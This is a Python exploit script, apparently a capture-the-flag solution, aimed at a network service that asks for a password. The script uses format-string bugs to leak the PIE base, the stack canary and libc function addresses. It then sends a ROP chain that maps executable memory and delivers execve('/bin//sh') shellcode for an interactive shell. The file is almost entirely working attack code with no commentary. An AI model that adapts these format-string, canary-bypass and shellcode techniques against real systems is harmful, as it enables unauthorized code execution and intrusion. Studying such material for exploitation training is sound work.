from zio import *
import sys

host = "127.0.0.1"
#host = "202.120.7.111"
port = 31337

io = zio((host, port), print_read = True, print_write = False)
io.read_until("pw?\n")
io.write("letmein\n")

#Leak PIE base & Canary
io.read_until("msg?\n")
junk = "*"
flag = "<<>>"
fs = "%79$08x%78$08x"

payload = fs + flag + junk * (0x80 - len(flag) - len(fs))
io.write(payload)
io.read_until(flag)
pie_base = int("0x" + io.before[-16:-8], 16) - 0xc10
canary = int("0x" + io.before[-8:], 16)

call_mmap = pie_base + 0xae6
call_read = pie_base + 0xa79

pop7ret = pie_base + 0x9a1

#Leak mmap address
io.read_until("msg?\n")
junk = "*"
fs = l32(call_mmap) + "_%14$s"

payload = fs + flag + junk * (0x80 - len(flag) - len(fs))
io.write(payload)
io.read_until(flag)
index = io.before.find("_")
mmap_addr = pie_base + 0xaea - (0xffffffff - l32(io.before[index + 1: index + 5]) + 1)

print hex(mmap_addr)
#Leak read address
io.read_until("msg?\n")
fs = l32(call_read) + "_%14$s"
payload = fs + flag + junk * (0x80 - len(flag) - len(fs))
io.write(payload)
io.read_until(flag)
index = io.before.find("_")
read_addr = pie_base + 0xa7d - (0xffffffff - l32(io.before[index + 1: index + 5]) + 1)

print hex(read_addr)

#ROP
io.read_until("msg?\n")
fs = "%256c"
ROP = l32(mmap_addr) + l32(pop7ret) + "%2$c\x10\x66\x66" + "\x01\x10\x01%2$c" + "\x07%2$c%2$c%2$c" + "\x32%2$c%2$c%2$c" + l32(0xffffffff) + "%2$c%2$c%2$c%2$c" + "bbbb" + l32(read_addr) + "\x66\x66\x66\x66" + "%2$c%2$c%2$c%2$c" + "\x66\x66\x66\x66" + "\x01\x01\x01\x01"

print "len:", len(ROP)

#ROP = "b" * 52 
padding = "b" * 12
#payload = "aaaaaaaa"
payload = fs + "%2$c" + l32(canary)[1:] + padding + ROP
io.write(payload)

io.read_until("msg?\n")

fs = ""
for i in range(78, 99):
	fs += "%" + str(i) + "$x."

io.write(fs + "--")

for i in range(11):
	io.read_until("msg?\n")
	io.write("a" + str(i))

io.read_until("a10")


sc = (
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80"
)

io.write(sc)

io.interact()
